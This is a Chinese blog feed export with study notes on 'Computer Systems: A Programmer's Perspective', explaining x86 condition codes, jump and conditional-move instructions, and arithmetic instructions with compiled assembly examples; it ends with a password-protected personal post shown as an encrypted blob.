<p>举个简单的例子，对于cmpl %edx，%eax这个指令来讲，假设%edx的值为y，%eax的值为x。则当x=y时，ZF将会被置为1。当x<y时，sf将会被置为1。而当x>y时，ZF和SF将同时为0。对于test指令来讲，则相对特别一点，它经常用于判断一个数是正数、负数，或者是0。当test用来判断一个数的正负零时，两个操作数为同一个，也就是说testl %eax，%eax可以用来判断%eax寄存器当中的值是正数、负数还是0。因此testl %eax，%eax就相当于cmpl $0，%eax这个指令。</y时，sf将会被置为1。而当x></p>
<p>对于testl %eax，%eax这个指令，或许有的猿友会比较容易蒙，想不明白它如何判断一个数到底是正是负还是零。其实这个道理是非常简单的，只是有时候会一时转不过来，当两个操作数相同时，则经过“与运算”以后还是它自身。此时系统会根据计算结果去设置条件码，而结果又是它自身，因此其实就相当于根据这个数的正负零去设置条件码，这样就可以判断出这个数的正负了。就像cmpl $0，%eax一样，在减去0之后，还是它自身，然后根据自身的正负零去设置条件码寄存器。</p>
<h3 id="访问条件码寄存器"><a href="#访问条件码寄存器" class="headerlink" title="访问条件码寄存器"></a>访问条件码寄存器</h3><p>对于普通寄存器来讲，使用的时候一般是直接读取它的值，而对于条件码寄存器来说，则不一定非要读取它的值才能使用。对于条件码寄存器来讲，有三种使用方式，都可以让它发挥作用。</p>
<ul>
<li>可以根据条件码寄存器的某个组合，将一个字节设置为0或1，其实这个就相当于读值。</li>
<li>可以直接条件跳转到程序的某个其它的部分。</li>
<li>可以有条件的传送数据。</li>
</ul>
<p>其中第一种方式涉及到<code>SET</code>指令，只用一个目的操作数，一条<code>SET</code>指令的目的操作数是8个单字节寄存器元素之一，或是存储一个字节的存储器位置，将这个字节设置成0或1。所以第一种方式其实就是普通寄存器的用法，直接读取条件码寄存器的值，然后进行使用。对于第二和第三种来说，就不是这样了，它们不会显示的读取条件码寄存器的值，而是直接使用。</p>
<h4 id="SET指令"><a href="#SET指令" class="headerlink" title="SET指令"></a>SET指令</h4><p><img src="/images/汇编-20.png" alt="SET指令"></p>
<p>对于<code>setae %al</code>指令来说，<code>%al</code>是<code>%eax</code>寄存器中的最后一个字节，这个指令的含义是，将<code>~CF</code>的值设置到<code>%eax</code>寄存器的最后一个字节。</p>
<h3 id="条件码寄存器的组合"><a href="#条件码寄存器的组合" class="headerlink" title="条件码寄存器的组合"></a>条件码寄存器的组合</h3><p>条件码寄存器的组合是执行跳转的重要判断依据，如何将条件码寄存器的组合与条件联系起来。</p>
<p>首先要说明的一点是，对于所有的组合都基于a-b这样的前提，也就是说条件码寄存器的值是经过了一个减运算设置后的值。例如，对于【e-&gt;ZF】这样的形式，代表的意思是字母e作为后缀时，则以ZF的值为1视为条件成立。</p>
<h3 id="条件跳转指令：jmp指令"><a href="#条件跳转指令：jmp指令" class="headerlink" title="条件跳转指令：jmp指令"></a>条件跳转指令：jmp指令</h3><p>这个指令是我们程序实现流程控制的关键指令，它可以直接将程序跳转到指定的位置，又或者根据条件码寄存器的组合进行条件跳转。</p>
<p><img src="/images/汇编-21.png" alt="jmp指令"></p>
<p>可以看到，除了两个jmp指令之外，其余指令均是由j与条件码的组合组成的，因此除了第一个jmp直接跳转指令以及第二个jmp间接跳转指令之外，剩下的12个都是条件跳转指令，它们基于条件码寄存器的组合进行跳转。</p>
<p>总的来说，跳转指令的地址编码一般有两种，第一种是基于PC的，第二种则是绝对地址。基于PC（程序计数器）则是指给出一个偏移量，这个偏移量基于当前下一条指令的地址，也就是PC当中的值，这是一种最常用的方式。绝对地址则比较简单，它将直接给出存储器当中代码的位置。</p>
<p>比如我们最容易理解的je指令，它代表的是“相等则跳转”。j是跳转的意思，e则是条件码的组合，代表英文equals，因为我们基于a-b去设置条件码寄存器，因此当ZF为1时，代表a等于b。因此ZF条件码寄存器就是相等的条件码组合，而je就代表相等则跳转，就像if(a==b){block}这样的代码所代表的意思。</p>
<ul>
<li><p>e-&gt;ZF（相等）：e是equals的意思。这里代表的组合是ZF，因为ZF在结果为0时设为1，即a-b=0，也就是说a==b。因此ZF代表的意义是相等。</p>
</li>
<li><p>ne-&gt;~ZF（不相等）：ne是not equals的意思。这里代表的组合是~ZF，也就是ZF做“非运算”，则很明显是不相等的意思。</p>
</li>
<li><p>s-&gt;SF（负数）：s这里没什么实际意义，因为负数的直译是negative number，首字母是n，这与not的首字母重复了，因此这里就取了SF条件码寄存器的首个字母（纯属LZ的猜测，无权威证明，不过LZ自我感觉应该八九不离十，0.0）。这里代表的组合是SF，因为SF在计算结果为负数时设为1，此时可以认为b为0，即a&lt;0。因此这里是负数的意思。</p>
</li>
<li><p>ns-&gt;~SF（非负数）：与s相反，加上n则是not的意思，因此这里代表非负数。</p>
</li>
<li><p>l-&gt;SF^OF（有符号的小于）：l代表的是less。这里的组合是SF^OF，即对SF和OF做“异或运算”。“异或运算”的意思则是代表，SF和OF不能相等。那么有两种情况，当OF为0时，则代表没有溢出，此时SF必须为1，SF为1则代表结果为负。即a-b&lt;0，也就是a&lt;b，也就是小于的意思。当OF为1时，则代表产生了溢出，而此时SF必须为0，也就是说结果最后为正数，那么此时则是负溢出，也可以得到a-b&lt;0，即a&lt;b。综合前面两种情况，SF^OF则代表小于的意思。</p>
</li>
<li><p>le-&gt;(SF^OF)|ZF（有符号的小于等于）：le是less equals的意思。有了前面小于的基础，这里就很容易理解了。SF^OF代表小于，ZF代表等于，因此两者的“或运算”则代表小于等于。</p>
</li>
<li><p>g-&gt;~(SF^OF)&amp;~ZF（有符号的大于）：g是greater的意思。这里的组合是~(SF^OF)&amp;~ZF，相对来说就比较复杂了。不过有了前面的铺垫，这个也非常好理解。SF^OF代表小于，则~(SF^OF)代表大于等于，而~ZF代表不等于，将~(SF^OF)与~ZF取“与运算”，则代表大于等于且不等于，也就是大于。</p>
</li>
<li><p>ge-&gt;~(SF^OF)（有符号的大于等于）：ge是greater equals的意思。这个组合就不需要再解释了吧。</p>
</li>
<li><p>b-&gt;CF（无符号的小于）：b是below的意思。CF是无符号溢出标志，这里的意思是指如果a-b结果溢出了，则代表a是小于b的，即a&lt;b。其实这个结论很显然，关键点就在于，无符号减法只有在减出负数的时候才可能溢出，也就是说只要结果溢出了，那么一定有a-b&lt;0。因此这个结论就显而易见了。</p>
</li>
<li><p>be-&gt;CF|ZF（无符号的小于等于）：这里是below equals的意思。因此这里会与ZF计算“或运算”，字面上也很容易理解，即CF（小于）|（或）ZF（等于），也就是小于等于。</p>
</li>
<li><p>a-&gt;~CF&amp;~ZF（无符号的大于）：a代表的是above。这个组合也是非常好理解的，CF代表小于，则~CF代表大于等于，~ZF代表不等于，因此~CF&amp;~ZF则代表大于等于且不等于，即大于。</p>
</li>
<li><p>ae-&gt;~CF（无符号的大于等于）：ae是above equals的意思。至于这个组合的意义，相信也不需要解释了吧。</p>
</li>
</ul>
<p>以上则是几乎所有的条件码寄存器组合，如果你完全理解了上面的组合，那么接下来的一系列指令会非常简单。它们只是基于条件码的组合，进行设值、跳转、传送的操作而已。从形式上来讲，上面这些组合与数据格式中的b、w、l的用法非常相似。</p>
<h4 id="基于PC的偏移量寻址"><a href="#基于PC的偏移量寻址" class="headerlink" title="基于PC的偏移量寻址"></a>基于PC的偏移量寻址</h4><p>相信大部分都听说过这样的说法，PC（程序计数器）会一直指向程序的下一条指令，因此这里所说的PC的相对位置，则是指跳转指令会附带一个偏移量，而这个偏移量与PC值的和则刚好指向跳转的位置。为了理解起来简单，这里举个简单的例子，我们考虑下面一段代码，这是一个非常简单的取两数最小值的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">int min(int a,int b)&#123;</div><div class="line">    if( a &lt; b )&#123;</div><div class="line">        return a;</div><div class="line">    &#125;else&#123;</div><div class="line">        return b;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们将其命名为jmp.c，并使用-O1和-S参数去编译它，我们将会得到以下汇编代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">	.file	&quot;jmp.c&quot;</div><div class="line">	.text</div><div class="line">	.globl	min</div><div class="line">	.type	min, @function</div><div class="line">min:</div><div class="line">.LFB0:</div><div class="line">	.cfi_startproc</div><div class="line">	pushl	%ebp</div><div class="line">	.cfi_def_cfa_offset 8</div><div class="line">	.cfi_offset 5, -8</div><div class="line">	movl	%esp, %ebp</div><div class="line">	.cfi_def_cfa_register 5</div><div class="line">	movl	8(%ebp), %eax</div><div class="line">	cmpl	12(%ebp), %eax</div><div class="line">	jge	.L2</div><div class="line">	movl	8(%ebp), %eax   </div><div class="line">	jmp	.L3</div><div class="line">.L2:</div><div class="line">	movl	12(%ebp), %eax</div><div class="line">.L3:</div><div class="line">	popl	%ebp</div><div class="line">	.cfi_restore 5</div><div class="line">	.cfi_def_cfa 4, 4</div><div class="line">	ret</div><div class="line">	.cfi_endproc</div><div class="line">.LFE0:</div><div class="line">	.size	min, .-min</div><div class="line">	.ident	&quot;GCC: (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4&quot;</div><div class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>经过前面的学习，不难看懂上面的汇编代码。其中a和b分别存储在栈顶+8和+12的位置，<code>cmpl    12(%ebp), %eax</code>比较 <code>a-b</code>的结果，如果<code>a&gt;=b</code>，就跳转到 .L2,执行<code>movl    12(%ebp), %eax</code>把b的值放到寄存器<code>%eax</code>中，作为函数返回值；如果<code>a&lt;b</code>则不跳转，执行<code>movl    8(%ebp), %eax</code>把a的值放到寄存器<code>%eax</code>中，作为函数返回值,然后<code>jmp</code>无条件跳转到 .L3 。可以看到，在汇编代码当中，<code>jmp族指令</code>会使用标签指示跳转地址，比如上面出现过的<code>.L2</code>、<code>.L3</code>。</p>
<p>不过经过汇编器处理之后，标签将不会再存在，此时会使用上面所说的PC偏移量记录跳转地址。接下来，我们看一下这个<code>偏移量寻址</code>的方式。我们可以使用-O1和-c编译jmp.c，并使用objdump加-d参数去查看jmp.o，这样会得到下面的反汇编代码。</p>
<p><img src="../images/汇编-22.png" alt="反汇编代码"></p>
<p>可以看到，这里面的指令序列与刚才的一模一样，因为我们采取了同样的优化等级-O1。值得注意的是，在第<code>0x9</code>行的指令<code>jge    10 &lt;min+0x10&gt;</code>中，跳转的偏移地址是<code>0x10</code>，也就是<code>mov    0xc(%ebp),%eax</code>,其实这个地址是通过偏移量计算出来的。作为暖男的我，已经在图上圈出来了，在指令的<code>jge    10</code>二进制序列<code>7d 05</code>中,<code>7d</code>指的是指令<code>jge</code>,<code>05</code>指的是操作数，此时的<code>pc</code>值是<code>0xb</code>。请切记<strong>PC（程序计数器）会一直指向程序的下一条指令</strong>，所以指令<code>jge</code>的跳转地址为<code>0x05+0xb = 0x10</code>,正是指令<code>mov    0xc(%ebp),%eax</code>。</p>
<p>为了证明这一点，我们可以使用hexdump加-C参数查看jmp.o。</p>
<p><img src="/images/汇编-23.png" alt="hexdump查看"></p>
<p>这下比较清楚了吧，当碰到<code>7d</code>指令（即jle）时，会检查后面的偏移量，结果一看是<code>0x05</code>，于是在条件满足的前提下，会跳过5个字节执行接下来的指令，也就是<code>8b 45 0c</code>（即mov指令）。</p>
<h3 id="条件传送指令：cmov指令"><a href="#条件传送指令：cmov指令" class="headerlink" title="条件传送指令：cmov指令"></a>条件传送指令：cmov指令</h3><p>接下来我们来看最后一种条件指令，叫做条件传送指令。顾名思义，条件传送指令的意思就是在满足条件的时候进行传送的指令，也就是cmov指令。它与set指令十分相似，同样有12种，也就是加上12种条件码寄存器的组合即可，以下是一张书中的指令表格。</p>
<p><img src="/images/汇编-24.png" alt="cmov指令"></p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer18.html" target="_blank" rel="external">深入理解计算机系统（3.6）—汇编中精妙的流程控制（重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-3</title>
    <link href="http://yoursite.com/2018/05/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-3/"/>
    <id>http://yoursite.com/2018/05/07/深入理解计算机系统-汇编的世界-3/</id>
    <published>2018-05-06T20:43:50.000Z</published>
    <updated>2018-05-06T14:10:08.003Z</updated>
    
    <content type="html"><![CDATA[<h3 id="算术与逻辑运算指令"><a href="#算术与逻辑运算指令" class="headerlink" title="算术与逻辑运算指令"></a>算术与逻辑运算指令</h3><p>算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非、左移右移等等。不过还有一个很神奇的指令 <code>leal</code>。</p>
<p><img src="/images/汇编-13.png" alt="算术与逻辑运算指令"></p>
<h3 id="leal指令"><a href="#leal指令" class="headerlink" title="leal指令"></a>leal指令</h3><p>leal指令是非常神奇的一个指令，它可以取一个存储器操作数的地址，并且将其赋给目的操作数。如果用C语言当中来对应的话，它就相当于&amp;运算。</p>
<p>比如对于<code>leal 4(%edx,%edx,4),%eax</code>这条指令来讲，我们假设<code>%edx</code>寄存器的值为x的话，那么这条指令的作用就是将<code>4 + x + 4x = 5x + 4</code>赋给<code>%eax</code>寄存器。它和<code>mov指令</code>的区别就在于，假设是<code>movl 4(%edx,%edx,4),%eax</code>这个指令，它的作用是将内存地址为<code>5x+4</code>的内存区域的值赋给<code>%eax</code>寄存器，而<code>leal指令</code>只是将5x+4这个地址赋给目的操<code>作数%eax</code>而已，它并不对存储器进行引用的值的计算。</p>
<p><img src="/images/汇编-14.png" alt="leal指令"></p>
<p>可以看到，此时在存储器中，地址为5x+4的区域的值为1000。那么此时若是进行movl 4(%edx,%edx,4),%eax操作，很显然，%eax的值应该为1000，也就是下图。</p>
<p><img src="/images/汇编-15.png" alt="leal指令"></p>
<p>但是如果进行leal 4(%edx,%edx,4),%eax操作的话，%eax的值就不是1000了，因为leal指令不会去取存储器当中的值，因此寄存器%eax的值应该是5x+4。</p>
<p><img src="/images/汇编-16.png" alt="leal指令"></p>
<p>试想一下，倘若在地址为5x+4的位置存储的是变量i，那么其实这条指令就相当于&amp;i操作，这也就是C语言当中的&amp;取地址操作的汇编级做法。</p>
<h3 id="特殊的算术操作指令"><a href="#特殊的算术操作指令" class="headerlink" title="特殊的算术操作指令"></a>特殊的算术操作指令</h3><p>不难发现这张图的指令跟上面的指令有点类似，不过下面的指令有点特殊：<strong>这些指令可以让只有32位的寄存器存储64位的数据</strong>。</p>
<p><img src="/images/汇编-17.png" alt="特殊的算术操作指令"></p>
<h3 id="imull、mull指令"><a href="#imull、mull指令" class="headerlink" title="imull、mull指令"></a>imull、mull指令</h3><p>这两个指令一看就是双胞胎，它们一个负责有符号全64位乘法，一个负责无符号全64位乘法。不难发现，imull这个指令好像是负责乘法的指令，而且在之前的乘法并没有区分有符号和无符号，现在怎么又成双胞胎指令了。</p>
<p>上张图中出现的指令是<code>IMUL指令</code>，当它操作双字的时候，也就是<code>imull指令</code>。不过不同的是，它的一般形式是<code>imull S D</code>，这里有两个操作数，它将计算S和D的乘积并截断为双字，然后存储在D当中。由于在截断时，无符号以及有符号的二进制序列是一样的，因此此处的乘法指令并不区分有符号和无符号。</p>
<p>现在我们讨论的<code>imull指令</code>，则与上面的普通乘法指令稍有不同，它只有一个操作数，也就是说，它的一般形式为<code>imull S</code>，这点在图片中也能看出来，而另外一个操作数默认为<code>%eax寄存器</code>。最终的结果，会将高32位存入%edx寄存器，而低32位存入%eax寄存器。</p>
<p>试想一下，如果我们只取%eax寄存器当中的32位结果，那其实这里计算的结果就是S*%eax，此时<code>imull S</code>的作用就与<code>imul S D</code>是一样的，只是目的操作数被固定为%eax罢了。</p>
<p>接下来我们看一个简单的示例，我们去看下指令<code>imull $0x3</code>的结果，我们假设此时<code>%eax</code>寄存器的值为<code>0x82345600</code>。也就是我们需要计算<code>0x3*0x82345600</code>的值，十六进制结果为<code>0xFFFF FFFE 869D 0200</code>。这个结果为64位的，因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-18.png" alt="imull指令"></p>
<p>可以看到，%eax保存着低32位的结果，单说这32位的话，它的有符号数值为-2036530688，正是我们直接计算0x3*0x82345600的32位截断后的有符号值，显然这个结果溢出了。如果组合上高32位，则结果为-6331497984，将它加上或者取模4294967296（2的32次方）将得到我们32位的结果。这里的有符号乘法采取的是先符号扩展被乘数，然后两者相乘，将结果再截断为64位所得。</p>
<p>对于mull的单操作数指令来讲，就比较简单了，它采用的是无符号乘法，因此就和我们平时的十进制乘法运算类似，只是同样的，它也会将结果的高32位存入%edx，将低32位存入%eax。</p>
<h3 id="cltd指令"><a href="#cltd指令" class="headerlink" title="cltd指令"></a>cltd指令</h3><p>这个指令相对来说就非常简单了，它就是简单的将%eax寄存器的值符号扩展32位到%edx寄存器，也就是说，如果%eax寄存器的二进制序列的最高位为0，则cltd指令将把%edx置为32个0，相反，如果%eax寄存器的二进制序列最高位为1，则cltd指令将会自从填充%edx寄存器为32个1。</p>
<h3 id="idivl、divl指令"><a href="#idivl、divl指令" class="headerlink" title="idivl、divl指令"></a>idivl、divl指令</h3><p>这两个指令与前面的imull以及mull类似，它也将计算结果存放在两个寄存器当中，其中余数存放在%edx寄存器，商存放在%eax寄存器。如果各位理解了前面的imull以及mull，那么这里idivl和divl理解起来会非常简单。</p>
<p>这里举一个简单的例子，考虑指令<code>idivl $0x3</code>的结果，我们假设此时%eax寄存器的值为<code>0x82345600</code>。也就是我们需要计算0x82345600/0x3的值，商为0xD6117200，余数为0x0。因此我们寄存器的前后状态如下所示。</p>
<p><img src="/images/汇编-19.png" alt="idivl指令"></p>
<p>可以看到，在idivl这个指令执行的过程中，其实对被除数进行了符号扩展，类似于cltd指令，或者有时也会将%eax移动到%edx，然后对%edx进行算术右移31位的运算。这两种方式的结果是一样的，都是将%eax符号扩展32位并存储在%edx当中。</p>
<p><a href="http://www.cnblogs.com/zuoxiaolong/p/computer16.html" target="_blank" rel="external">深入理解计算机系统（3.4）—算数与逻辑运算指令详解</a><br><a href="http://www.cnblogs.com/zuoxiaolong/p/computer17.html" target="_blank" rel="external">深入理解计算机系统（3.5）—特殊的算术操作指令详解</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;算术与逻辑运算指令&quot;&gt;&lt;a href=&quot;#算术与逻辑运算指令&quot; class=&quot;headerlink&quot; title=&quot;算术与逻辑运算指令&quot;&gt;&lt;/a&gt;算术与逻辑运算指令&lt;/h3&gt;&lt;p&gt;算术与逻辑运算包括很多种，估计各位猿友也能很快的想出来，比如最常见的加减乘除、与或非
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>总结|我的大二下</title>
    <link href="http://yoursite.com/2018/05/07/%E6%80%BB%E7%BB%93-%E6%88%91%E7%9A%84%E5%A4%A7%E4%BA%8C%E4%B8%8B/"/>
    <id>http://yoursite.com/2018/05/07/总结-我的大二下/</id>
    <published>2018-05-06T19:39:25.000Z</published>
    <updated>2018-05-06T17:03:11.776Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" Welcome to my blog, enter password to read. " /> <label for="pass"> Welcome to my blog, enter password to read. </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> 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